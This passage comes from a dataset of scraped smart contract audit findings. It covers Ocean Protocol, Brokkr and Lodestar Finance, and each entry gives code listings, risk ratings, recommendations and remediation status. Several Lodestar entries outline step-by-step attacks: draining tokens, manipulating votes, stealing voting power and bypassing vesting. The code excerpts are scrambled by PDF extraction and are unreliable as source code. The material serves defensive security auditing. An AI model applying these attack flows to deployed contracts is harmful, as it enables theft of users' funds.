dtBalance = ( exchanges [ exchangeId ].  dtBalance ). add ( 462 463 464 465 466 467 dataTokenAmount ); if ( baseTokenAmount > exchanges [ exchangeId ]. btBalance ) { require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 468 469 470 471 472 exchanges [ exchangeId ]. exchangeOwner , msg . sender , baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" 473 ); 55 474 475 } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 478 479 480 481 482 483 484 485 486 487 488 489 490", "labels": ["Halborn", "Ocean_Protocol", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the ERC721Factory.sol, SideStaking.sol, BFactory.sol and FactoryRouter .sol contract, there are instances where external methods are called, and the return values are not stored in a local or state variable. Code Location: ERC721Factory Listing 34: ERC721Factory.sol (Line 484) 479 require ( IERC20Template ( publishMarketFeeToken ).  transferFrom ( 480 481 482 483 484 msg . sender , address ( this ) , publishMarketFeeAmount ) , ' Failed to transfer publishFee '); IERC20Template ( publishMarketFeeToken ). approve (  orders [i ]. tokenAddress , publishMarketFeeAmount ); 485 } ERC721Factory Listing 35: ERC721Factory.sol (Line 494) 489 require ( IERC20Template ( orders [ i ]. consumeFeeToken ).  transferFrom ( 490 491 492 493 494 msg . sender , address ( this ) , orders [i ]. consumeFeeAmount ) , ' Failed to transfer consumeFee '); IERC20Template ( orders [i ]. consumeFeeToken ). approve (  orders [i ]. tokenAddress , orders [ i ]. consumeFeeAmount ); 495 } 59 ERC721Factory Listing 36: ERC721Factory.sol (Line 598) 597 598 // allow router to take the liquidity IERC20Template ( _PoolData . addresses [1]) . approve ( router ,  _PoolData . ssParams [4]) ; 599 600 601 602 603 604 poolAddress = IERC20Template ( erc20Address ). deployPool ( _PoolData . ssParams , _PoolData . swapFees , _PoolData . addresses ); FactoryRouter Listing 37: FactoryRouter.sol (Lines 273,292,294,295,296,297,298,299 ,316,321) 262 263 264 265 266 267 268 269 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { if ( _operations [ i ]. operation == operationType .  SwapExactIn ) { 270 271 // Get amountIn from user to router IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , _operations [ i ]. amountsIn ); 272 273 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , _operations [ i ]. amountsIn ); 274 275 276 277 278 279 280 281 282 // Perform swap ( uint amountReceived ,) = IPool ( _operations [i ]. source ) . swapExactAmountIn ( _operations [ i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // transfer token swapped to user 60 283 284 require ( IERC20 ( _operations [i ]. tokenOut ).  transfer ( msg . sender , amountReceived ) , ' Failed MultiSwap '); 285 } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 286  exact Out 287 288 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 289 290 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 291 292 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 293 294 295 296 297 298 299 300 301 302 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 303 304 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 305 306 307 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 308 309 310 311 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 312 313 314 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 315 // we approve pool to pull token from router 61 316 IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 317 318 319 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 320 321 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 322 323 324 325 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); } } 326 327 328 329 330 } SideStaking Listing 38: SideStaking.sol (Line 258) 245 246 247 248 249 250 251 252 function Stake ( address datatokenAddress , address stakeToken , uint256 amount ) public { if ( _datatokens [ datatokenAddress ]. bound != true ) return ; require ( msg . sender == _datatokens [ datatokenAddress ].  poolAddress , 253 254 255 256 257 258 \" ERR : Only pool can call this \" ); bool ok = canStake ( datatokenAddress , stakeToken , amount ); if ( ok != true ) return ; IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  amount ); 259 260 } _datatokens [ datatokenAddress ]. datatokenBalance -= amount ; 62 SideStaking Listing 39: SideStaking.sol (Lines 322,326,327,328,329) 320 321 322 // approve the tokens and amounts IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  dataTokenAmount ); IERC20Template dtBase = IERC20Template ( _datatokens [ datatokenAddress ]. basetokenAddress ); dtBase . approve ( _datatokens [ datatokenAddress ]. poolAddress , baseTokenAmount ); 323 324 325 326 327 328 329 BFactory Listing 40: BFactory.sol (Lines 117,118,119,120,121,122) 116 117 118 119 120 121 122 123 124 // requires approval first from basetokenSender ISideStaking ( addresses [0]) . newDataTokenCreated ( tokens [0] , tokens [1] , bpool , addresses [3] , // publisherAddress ssParams ); return bpool ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add return values check to avoid unexpected contract crashes. This can be implemented with a require statement and will help handle exceptions more comprehensively. 63 Remediation Plan: PARTIALLY SOLVED: The Ocean Protocol team amended certain functionalities to include return value checking; however, the following functions were called without checking the return value:  newDataTokenCreated: BFactory contract  swapExactAmountOut function called within the buyDTBatch function : FactoryRouter contract 64 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: Low"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "For There are several instances where address validation is missing. instance, zero address validation failure has been found when assigning user-supplied address values to state variables directly. The following list shows all the instances where zero address check failure was identified:  ERC721Factory.sol: variable _router  FactoryRouter.sol: variables _routerOwner, _opfCollector within the constructor, and variable _factory within function addFactory  ERC20Template.sol, variables within _publishMarketFeeAddress and setPublishingMarketFee; _publishMarketFeeToken variable _newFeeCollector within function setFeeCollector  SideStaking.sol, variable _router within the constructor  BPool.sol variable _newCollector within updateMarketFeeCollector function Code Location: ERC721Factory Listing 41: ERC721Factory.sol (Lines 83,93) 79 80 81 82 83 84 85 86 87 88 constructor ( address _template721 , address _template , address _collector , address _router ) { require ( _template != address (0) && _collector != address (0) && _template721 != address (0) , 65 \" ERC721DTFactory : Invalid template token / community fee 89  collector address \" ); 90 add721TokenTemplate ( _template721 ); 91 addTokenTemplate ( _template ); 92 router = _router ; 93 94 communityFeeCollector = _collector ; 95 } FactoryRouter Listing 42: FactoryRouter.sol (Lines 41,42) constructor ( 34 35 36 37 38 39 40  _preCreatedPools ) { 41 42 43 44 } address _routerOwner , address _oceanToken , address _bpoolTemplate , address _opfCollector , address [] memory _preCreatedPools routerOwner = _routerOwner ; opfCollector = _opfCollector ; oceanTokens [ _oceanToken ] = true ; ) public BFactory ( _bpoolTemplate , _opfCollector , FactoryRouter Listing 43: FactoryRouter.sol (Line 68) 66  { 67 68 69 function addFactory ( address _factory ) external onlyRouterOwner require ( factory == address (0) , \" FACTORY ALREADY SET \" ); factory = _factory ; } ERC20Template.sol 66 Listing 44: ERC20Template.sol (Lines 555,556,558,559) 554 555 556 557 function setPublishingMarketFee ( address _publishMarketFeeAddress , address _publishMarketFeeToken , uint256 _publishMarketFeeAmount ) external  onlyPublishingMarketFeeAddress { 558 559 560 561 } publishMarketFeeAddress = _publishMarketFeeAddress ; publishMarketFeeToken = publishMarketFeeAmount = _publishMarketFeeAmount ; _publishMarketFeeToken ; ERC20Template.sol Listing 45: ERC20Template.sol (Lines 527,532) 527 528 529 530 531 532 533 function setFeeCollector ( address _newFeeCollector ) external { require ( permissions [ msg . sender ]. feeManager == true , \" ERC20Template : NOT FEE MANAGER \" ); feeCollector = _newFeeCollector ; } SideStaking.sol Listing 46: SideStaking.sol (Line 61) 60 61 62 constructor ( address _router ) public { router = _router ; } Listing 47: BPool.sol (Line 274) 272 function updateMarketFeeCollector ( address _newCollector )  external { 273 require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 274 275 } _marketCollector = _newCollector ; 67 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed on this function due to the role-based access controls (RBAC) it is recommended to add proper address validation when assigning user supplied input to a variable. This could be as simple as using the following statement: Listing 48 1 require ( address_input != 0 , \" Address is zero \" ) Remediation Plan: SOLVED: The Ocean Protocol team implemented the recommended fix to ensure addresses are not equal to zero. 68 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: Low"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As a result, loss of Soliditys integer division could be truncated. precision can sometimes be avoided by multiplying before dividing, al- though the manual implementation of the precision/decimal calculation is taken care of by the developer. In the smart contracts set, there are multiple instances where division is performed before multiplication. Code Location: FixedRateExchange Listing 49: FixedRateExchange.sol (Lines 259,260,261,262,263,268,269 ,270,273,274,275) 248 function calcBaseInGivenOutDT ( bytes32 exchangeId , uint256  dataTokenAmount ) 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 public view onlyActiveExchange ( exchangeId ) returns ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) { baseTokenAmountBeforeFee = dataTokenAmount . mul ( exchanges [ exchangeId ]. fixedRate ) . div ( BASE ) . mul (10** exchanges [ exchangeId ]. btDecimals ) . div (10** exchanges [ exchangeId ]. dtDecimals ); oceanFeeAmount ; if ( getOPFFee ( exchanges [ exchangeId ]. baseToken ) != 0) { oceanFeeAmount = baseTokenAmountBeforeFee 69 269 270 271 272 273 274 275 276 277 278 . mul ( getOPFFee ( exchanges [ exchangeId ]. baseToken )) . div ( BASE ); } marketFeeAmount = baseTokenAmountBeforeFee . mul ( exchanges [ exchangeId ]. marketFee ) . div ( BASE ); baseTokenAmount = baseTokenAmountBeforeFee . add (  marketFeeAmount ). add ( oceanFeeAmount 279 280 281 282 ); } FixedRateExchange Listing 50: FixedRateExchange.sol (Lines 301,302,303,304,305,310,311 ,312,315,316,317) 290 function calcBaseOutGivenInDT ( bytes32 exchangeId , uint256  dataTokenAmount ) 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 public view onlyActiveExchange ( exchangeId ) returns ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) { baseTokenAmountBeforeFee = dataTokenAmount . mul ( exchanges [ exchangeId ]. fixedRate ) . div ( BASE ) . mul (10** exchanges [ exchangeId ]. btDecimals ) . div (10** exchanges [ exchangeId ]. dtDecimals ); oceanFeeAmount ; if ( getOPFFee ( exchanges [ exchangeId ]. baseToken ) != 0) { oceanFeeAmount = baseTokenAmountBeforeFee 70 311 312 313 314 315 316 317 318 319 320 . mul ( getOPFFee ( exchanges [ exchangeId ]. baseToken )) . div ( BASE ); } marketFeeAmount = baseTokenAmountBeforeFee . mul ( exchanges [ exchangeId ]. marketFee ) . div ( BASE ); baseTokenAmount = baseTokenAmountBeforeFee . sub (  marketFeeAmount ). sub ( oceanFeeAmount 321 322 323 324 ); } SideStaking Listing 51: SideStaking.sol (Lines 314,315,316,317,318) uint256 baseTokenAmount = _datatokens [ datatokenAddress ] . basetokenBalance ; // given the price , compute dataTokenAmount uint256 dataTokenAmount = (( _datatokens [ datatokenAddress ]. baseTokenAmount * dataTokenWeight ) / baseTokenWeight / BASE ) * (10**(18 - decimals )) ; 310 311 312 313 314  rate * 315 316 317 318 319 SideStaking Listing 52: SideStaking.sol (Lines 378,379,380,381,383) 375 376 377 378 _datatokens [ datatokenAddress ]. vestingLastBlock ; } uint256 vestPerBlock = _datatokens [ datatokenAddress ].  vestingAmount . div ( 379 _datatokens [ datatokenAddress ]. vestingEndBlock - 71 380 381 382 383 384 385 _datatokens [ datatokenAddress ]. blockDeployed ); if ( vestPerBlock == 0) return ; uint256 amount = blocksPassed . mul ( vestPerBlock ); if ( amount > 0 && Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider performing multiplications before divisions to ensure precision in results when using non-floating-point data types. Remediation Plan: SOLVED: The Ocean Protocol team amended smart contracts to perform mul- tiplication operations before division. 72 3.10 (HAL-10) USE OF BLOCK-TIMESTAMP - LOW ", "labels": ["Halborn", "Ocean_Protocol", "Severity: Informational"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P2_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Incorrect use of the update_config function in contracts can set owner to have an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the contract owner can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  epoch-manager  distributor-v1 Code Location: Listing 1: contracts/distributor-v1/src/commands.rs (Lines 23-26) 21 let mut config = load_config ( deps . storage ) ?; 22 23 if let Some ( owner ) = owner { 24 25 } config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 2: contracts/bbro-minter/src/commands.rs (Lines 28-30) 26 let mut config = load_config ( deps . storage ) ?; 27 28 if let Some ( owner ) = owner { 29 30 } config . owner = deps . api . addr_canonicalize (& owner ) ?; 13 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split the owner transfer functionality into the set_owner and accept_ownership functions. This last function allows the recipient to complete the transfer. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 14 ", "labels": ["Halborn", "Brokkr_Protocol_P2_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "UNCHECKED ARITHMETICAL OPERATIONS CAN CAUSE PANIC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P2_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When calculating the distribution of rewards, the distributor-v1 contract performs a division without checking that the denominator is not zero. In the event that epoch_manager is misconfigured and has an epoch length of 0 blocks (that can happen because the epoch manager does not check for that condition), the distribute function would panic, leaving the user without a precise error message for your failed transaction. Code Location: Listing 3: contracts/distributor-v1/src/commands.rs, (Line 44) & deps . querier , deps . api . addr_humanize (& config . epoch_manager_contract )? , 35 // query epoch from epoch_manager contract 36 let epoch_blocks = query_epoch_info ( 37 38 39 )? 40 . epoch ; 41 42 // distribute rewards only for passed epochs 43 let blocks_since_last_distribution = env . block . height - state .  last_distribution_block ; 44 let passed_epochs = blocks_since_last_distribution / epoch_blocks ; 45 if passed_epochs == 0 { 46 47 } return Err ( ContractError :: NoRewards {}) ; Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: When performing arithmetic operations, it is recommended that you use For example, the line of code could be replaced checked arithmetic. with: blocks_since_last_distribution.checked_div(epoch_blocks). Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. They also stated that since epoch_blocks is a primitive type, there is no need to convert it to a wrapped as that would break the whole protocol. 16 ", "labels": ["Halborn", "Brokkr_Protocol_P2_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "ESLODE TOKENS CAN BE DRAINED BY CALLING WITHDRAWESLODE(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The StakingRewards contract implements the function withdrawEsLODE() that allows users to unstake their esLODE without converting them to LODE: Listing 1: StakingRewards.sol (Line 347) 338 /* * 339 340 * @notice Withdraw esLODE * @dev can only be called by the end user when withdrawing of  esLODE is allowed */ 341 342 function withdrawEsLODE () external nonReentrant { 343 require ( withdrawEsLODEAllowed == true , \" esLODE Withdrawals Not  Permitted \" ); 344 345 346 347 348 349 } // harvest () ; StakingInfo storage account = stakers [ msg . sender ]; uint256 totalEsLODE = account . totalEsLODEStakedByUser ; esLODE . safeTransfer ( msg . sender , totalEsLODE ); emit UnstakedEsLODE ( msg . sender , totalEsLODE ); Although, this function does not update the storage after withdrawing, allowing any user to repeatedly call this function, draining all the esLODE from the contract. Proof of Concept: The proof of concept shows how the user1 is able to repeatedly call the withdrawEsLODE() function, draining all the esLODE from the contract. 25 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to reset the stakers[msg.sender].totalEsLODEStakedByUser storage to 0 after the withdrawEsLODE() call. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 26 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "VOTING POWER CAN BE MANIPULATED BY STAKING, VOTING, UNSTAKING 10 SECONDS LATER AND TRANSFERRING LODE TO A NEW WALLET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The VotingPower contract calculates the users voting power through the StakingRewards.accountVoteShare() function: Listing 2: StakingRewards.sol 694 /* * 695 * @notice Function used to calculate a user 's voting power for  emissions voting 696 697 * @param account The staker 's address * @return Returns the user 's voting power as a percentage of the  total voting power */ 698 699 function accountVoteShare ( address account ) public view returns (  uint256 ) { 700 701 702 703 704 705 706 uint256 stLODEStaked = stakers [ account ]. stLODEAmount ; uint256 vstLODEStaked = stakers [ account ]. relockStLODEAmount ; uint256 totalStLODEStaked = totalSupply () - totalRelockStLODE ; uint256 totalVstLODEStaked = totalRelockStLODE ; uint256 totalStakedAmount = stLODEStaked + vstLODEStaked ; uint256 totalStakedBalance = totalStLODEStaked +  totalVstLODEStaked ; 707 708 709 710 711 if ( totalStakedBalance == 0) { return 0; } 27 712 713 } return ( totalStakedAmount * 1 e18 ) / totalStakedBalance ; As soon as LODE is staked in the StakingRewards contract, the voting power is increased. Although, the minimum period of time that LODE can be staked is just 10 seconds. Hence, any user could: 1. Stake LODE for 10 seconds. 2. Vote with their increased voting power. 3. Wait 10 seconds, unstake, transfer the LODE tokens to another wallet. 4. Stake LODE using the new wallet. 5. Vote again. 6. Repeat. 28 This way, the votes can be easily manipulated. BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: It is recommended to set the minimum stake period to one week or simply do not assign any voting power to users which lockTime is set only to 10 seconds. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 29 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "VOTING POWER CAN BE STOLEN BY CALLING VOTINGPOWER.DELEGATE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The VotingPower contract contains the function delegate() which supposedly is used to delegate voting power to another address of the users choice: Listing 3: VotingPower.sol 95 // / @notice Delegates existing voting power to an address of the  user 's choice . 96 // / @param to The address in which the user wishes to delegate  their voting power to . 97 function delegate ( address to ) external resetVotesIfNeeded  whenNotPaused { 98 99 100 } voteDelegates [ msg . sender ] = to ; emit DelegateChanged ( msg . sender , to ); Moreover, VotingPower.vote() function to calculate the voting power: voteDelegates incorrectly mapping this is used in the Listing 4: VotingPower.sol (Line 146) string [] calldata tokens , OperationType [] calldata operations , uint256 [] calldata shares 128 function vote ( 129 130 131 132 ) external resetVotesIfNeeded whenNotPaused { 133 134 require ( tokens . length == operations . length && tokens . length == 30  shares . length , 135 136 137 138 139 140 \" Arrays must have the same length \" ); uint256 currentWeek = getCurrentWeek () ; require ( // Will pass if lastVotedWeek [ msg . sender ] is less than  currentWeek (i . e., the user hasn 't voted this week ) or if  currentWeek and lastVotedWeek [ msg . sender ] are both 0 141 // ( i. e ., it 's the first week since the contract was  deployed and the user hasn 't voted before ) . 142 lastVotedWeek [ msg . sender ] < currentWeek || ( currentWeek ==  0 && lastVotedWeek [ msg . sender ] == 0 && ! previouslyVoted [ msg .  sender ]) , 143 144 145 146 \" You have already voted this week \" ); uint256 userVotingPower = stakingRewards . accountVoteShare (  voteDelegates [ msg . sender ] == address (0) ? msg . sender :  voteDelegates [ msg . sender ]) ; 147 148 149 150 151 152 153 154 155 uint256 totalShares = 0; for ( uint256 i = 0; i < tokens . length ; i ++) { string memory token = tokens [ i ]; OperationType operation = operations [ i ]; uint256 share = shares [ i ]; require ( share > 0, \" Share must be greater than 0 \" ); require ( tokenEnabled [ token ], \" Token is not enabled for  voting \"); 156 157 if (! bothOperationsAllowed [ token ]) { require ( operation == OperationType . SUPPLY , \" Only  supply emissions are allowed for this token \"); 158 159 160 161 } userVotes [ msg . sender ][ i ] = Vote ( share , token , operation ); totalVotes [ token ][ operation ] = totalVotes [ token ][ operation  ]. add ( share ); 162 163 164 165 166 167 totalShares = totalShares . add ( share ); emit VoteCast ( msg . sender , token , operation , share ); } require ( totalShares <= userVotingPower , \" Voted shares exceed 31  user 's voting power \" ); 168 169 170 } lastVotedWeek [ msg . sender ] = currentWeek ; previouslyVoted [ msg . sender ] = true ; Basically, when stakingRewards.accountVoteShare() is called, if the voteDelegates mapping is not pointing to the address(0), the voting power of the voteDelegates mapping address will be used. This flawed implementation allows anyone to vote with the voting power of another user by simply calling delegate(<high voting power address>). Proof of Concept: 32 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: It is recommended to either rebuild from scratch the delegating logic or otherwise remove it. Some example implementation of voting power delegation can be found in OpenZeppelins Votes contract. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 33 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "THE ONE YEAR VESTING PERIOD FOR ESLODE TOKENS CAN BE BYPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the StakingRewards contract, the function convertEsLODEToLODE() is used to convert vested esLODE to LODE. The vesting period of the esLODE tokens is 365 days: Listing 5: StakingRewards.sol (Line 252) 239 /* * 240 * @notice Converts vested esLODE to LODE and updates user reward  shares accordingly accounting for current lock time and relocks * @param user The staker 's address */ 241 242 243 function convertEsLODEToLODE ( address user ) public returns ( uint256  ) { 244 // since this is also called on unstake and harvesting , we exit  out of this function if user has no esLODE staked . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 if ( stakers [ msg . sender ]. totalEsLODEStakedByUser == 0) { return 0; } uint256 lockTime = stakers [ user ]. lockTime ; uint256 threeMonthCount = stakers [ user ]. threeMonthRelockCount ; uint256 sixMonthCount = stakers [ user ]. sixMonthRelockCount ; uint256 totalDays = 365 days ; uint256 amountToTransfer ; uint256 stLODEAdjustment ; uint256 conversionAmount ; Stake [] memory userStakes = esLODEStakes [ msg . sender ]; for ( uint256 i = 0; i < userStakes . length ; i ++) { 34 260 uint256 timeDiff = ( block . timestamp - userStakes [ i ].  startTimestamp ); 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 uint256 alreadyConverted = userStakes [ i ]. alreadyConverted ; if ( timeDiff >= totalDays ) { conversionAmount = userStakes [ i ]. amount ; amountToTransfer += conversionAmount ; userStakes [ i ]. amount = 0; if ( lockTime == 90 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE3M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } else if ( lockTime == 180 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE6M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } } else if ( timeDiff < totalDays ) { uint256 conversionRatioMantissa = ( timeDiff * BASE ) /  totalDays ; 284 conversionAmount = (( userStakes [i ]. amount *  conversionRatioMantissa ) / BASE ) - alreadyConverted ; 285 286 amountToTransfer += conversionAmount ; esLODEStakes [ msg . sender ][ i ]. alreadyConverted +=  conversionAmount ; 287  ; 288 289 290 291 292 293 294 295 296 297 298 esLODEStakes [ msg . sender ][ i ]. amount -= conversionAmount if ( lockTime == 90 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE3M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } else if ( lockTime == 180 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE6M - 1 e18 ) + 35 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } } } stakers [ user ]. lodeAmount += amountToTransfer ; stakers [ user ]. totalEsLODEStakedByUser -= amountToTransfer ; totalEsLODEStaked -= amountToTransfer ; if ( stLODEAdjustment != 0) { stakers [ user ]. stLODEAmount += stLODEAdjustment ; UserInfo storage userRewards = userInfo [ user ]; uint256 _prev = totalSupply () ; updateShares () ; unchecked { userRewards . amount += uint96 ( stLODEAdjustment ); shares += uint96 ( stLODEAdjustment ); } userRewards . wethRewardsDebt = userRewards . wethRewardsDebt + int128 ( uint128 ( _calculateRewardDebt ( accWethPerShare ,  uint96 ( stLODEAdjustment )) )) ; 326 327 328 329 330 _mint ( address ( this ) , stLODEAdjustment ); unchecked { if ( _prev + stLODEAdjustment != totalSupply () ) revert  DEPOSIT_ERROR () ; 331 332 333 334 335 336 } } } esLODE . transfer ( address (0) , amountToTransfer ); return conversionAmount ; The convertEsLODEToLODE(address user) function has a user parameter that when used with an account different from msg.sender causes the following 36 exploit: 1. User1 stakes 1000e18 esLODE and waits 365 days. User1s esLODE tokens are vested at this point. 2. User1 creates another wallet, lets call this wallet User2. 3. User2 stakes 1000e18 esLODE tokens. 4. User1 calls convertEsLODEToLODE(<user2 address>). 5. User2 esLODE tokens are converted right away to LODE 6. Repeat this process with other wallets to totally bypass the vesting period. 37 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: is It recommended convertEsLODEToLODE() logic using msg.sender. Remediation Plan: remove to function the and user perform parameter all the from the function SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 38 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "LODE TOKENS CAN BE PERMANENTLY STUCK IN THE STAKINGREWARDS CONTRACT DUE TO WRONG MINTING/BURNING LOGIC IN STAKE/UNSTAKE LODE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the StakingRewards contract, VotingPower is minted every time a user calls stakeLODE() and burnt every time a user calls the unstakeLODE() function. Although, in the convertEsLODEToLODE() function, when lockTime is dif- ferent from 10 seconds, VotingPower is also burnt: Listing 6: StakingRewards.sol (Line 367) 364 // Adjust voting power if user is locking LODE 365 if ( stakers [ msg . sender ]. lockTime != 10 seconds ) { 366 // if user is unlocked , we need to burn their converted amount  of voting power 367 368 } else { votingContract . burn ( msg . sender , conversionAmount ); lockTime will be different from 10 seconds if: 1. User staked LODE with 90 or 180 days lockTime. 2. User has not staked LODE yet. Based on this implementation, the following flow would cause an overflow, not allowing users to unstake their LODE tokens: 39 1 year later, when the vesting is completed, 1. Alice stakes 100 esLODE tokens. She receives 100 VotingPower. 2. Alice calls convertEsLODEToLODE() converting those 100 esLODE tokens into 100 As she hadnt staked any LODE 